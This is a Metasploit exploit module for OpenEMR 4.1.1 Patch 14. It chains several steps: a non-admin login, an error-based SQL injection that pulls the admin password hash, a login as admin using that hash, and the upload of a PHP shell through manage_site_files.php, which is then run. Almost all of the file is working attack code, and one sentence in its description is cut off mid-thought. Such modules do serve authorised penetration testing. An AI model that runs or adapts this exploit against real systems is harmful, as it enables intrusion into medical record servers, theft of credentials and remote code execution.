# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "OpenEMR 4.1.1 Patch 14 SQLi Privilege Escalation Remote Code Execution",
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability found in OpenEMR version 4.1.1 Patch 14 and lower.
        When logging in as any non-admin user it&#039;s possible to retrieve the admin SHA1 password
        hash from the database through SQL injection. The SQL injection vulnerability exists
        user. After logging in, the "manage_site_files.php" page will be used to upload arbitrary
        code.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;xistence <xistence[at]0x90.nl>&#039; # Discovery, Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;EDB&#039;, &#039;28329&#039;]
        ],
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [&#039;OpenEMR&#039;, {}]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Sep 16 2013",
      &#039;DefaultTarget&#039;  => 0))
 
      register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to the OpenEMR installation&#039;, &#039;/openemr&#039;]),
          OptString.new(&#039;USER&#039;, [true, &#039;The non-admin user&#039;, &#039;&#039;]),
          OptString.new(&#039;PASS&#039;, [true, &#039;The non-admin password&#039;, &#039;&#039;])
        ], self.class)
  end
 
  def peer
    return "#{rhost}:#{rport}"
  end
 
  def uri
    return target_uri.path
  end
 
  def check
    # Check version
    print_status("#{peer} - Trying to detect installed version")
 
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(uri, "interface", "login", "login.php")
    })
 
    if res and res.code == 200 and res.body =~ /v(\d+.\d+.\d+)/
      version = $1
    else
      return Exploit::CheckCode::Unknown
    end
 
    print_status("#{peer} - Version #{version} detected")
 
    if version < "4.1.2"
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Safe
    end
  end
 
  def login(base, name, pass)
    #print_status("#{peer} - Logging in as non-admin user [ #{datastore[&#039;USER&#039;]} ]")
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri("#{base}", "interface", "main", "main_screen.php"),
      &#039;vars_get&#039; => {
          "auth" => "login",
          "site" => "default"
      },
      &#039;vars_post&#039; => {
        &#039;authProvider&#039; => &#039;Default&#039;,
        &#039;authUser&#039; => "#{name}",
        &#039;authPass&#039; => "#{pass}"
        }
    })
 
    if res && res.code == 200 and res.headers[&#039;Set-Cookie&#039;] =~ /OpenEMR=([a-zA-Z0-9]+)/
      session = $1
      print_status("#{rhost}:#{rport} - Login successful")
      print_status("#{rhost}:#{rport} - Session cookie is [ #{session} ]")
      return session
    else
      fail_with(Failure::Unknown, "#{peer} - Login was not succesful!")
    end
  end
 
  def exploit
    # Password should be converted to a SHA1 hash
    password = Rex::Text.sha1(datastore[&#039;PASS&#039;])
 
    # Login as non-admin
    cookie = login(uri, datastore[&#039;USER&#039;], password)
 
    sqlq = rand_text_alpha(8)
    # Generate random string and convert to hex
    sqls = sqlq.each_byte.map { |b| b.to_s(16) }.join
 
    # Our SQL Error-Based Injection string - The string will return the admin password hash between the words ABCD<hash>ABCD in the response page.
    sqli = "1&#039; AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x#{sqls},(SELECT MID((IFNULL(CAST(password AS CHAR),0x20)),1,50) "
    sqli << "FROM users WHERE username = 0x61646d696e LIMIT 0,1),0x#{sqls},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND &#039;#{sqlq}&#039;=&#039;#{sqlq}"
 
    post_data = "form_pubpid=#{sqli}"
    print_status("#{peer} - Retrieving admin password hash through SQLi")
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;data&#039;   => post_data,
      &#039;cookie&#039; => "OpenEMR=#{cookie}",
    })
 
    if res and res.code == 200 and res.body =~ /#{sqlq}([a-zA-Z0-9]+)#{sqlq}/
      adminhash = $1
      print_status("#{peer} - Admin password hash is [ #{adminhash} ]")
    else
      fail_with(Failure::Unknown, "#{peer} - Retrieving admin password failed!")
    end
 
    # Login as admin and retrieve cookie
    cookie = login(uri, "admin", "#{adminhash}")
 
    # Random filename
    payload_name = rand_text_alpha(rand(10) + 5) + &#039;.php&#039;
 
    post_data = Rex::MIME::Message.new
    post_data.add_part("", nil, nil, "form-data; name=\"bn_save\"")
    post_data.add_part(payload.encoded, "application/octet-stream", nil, "form-data; name=\"form_image\"; filename=\"#{payload_name}\"")
    file = post_data.to_s
    file.strip!
 
    print_status("#{peer} - Uploading shell [ #{payload_name} ]")
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(uri, "interface", "super", "manage_site_files.php"),
      &#039;ctype&#039;  => "multipart/form-data; boundary=#{post_data.bound}",
      &#039;cookie&#039; => "OpenEMR=#{cookie}",
      &#039;data&#039;   => file
    })
 
    # If the server returns 200 and the body contains our payload name,
    # we assume we uploaded the malicious file successfully
    if not res or res.code != 200 or res.body !~ /#{payload_name}/
      fail_with(Failure::Unknown, "#{peer} - File wasn&#039;t uploaded, aborting!")
    end
 
    register_file_for_cleanup(payload_name)
 
    print_status("#{peer} - Requesting shell [ #{uri}/sites/default/images/#{payload_name} ]")
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(uri, "sites", "default", "images", "#{payload_name}")
    })
 
    # If we don&#039;t get a 200 when we request our malicious payload, we suspect
    # we don&#039;t have a shell, either.
    if res and res.code != 200
      print_error("#{peer} - Unexpected response, exploit probably failed!")
    end
 
  end
 
end

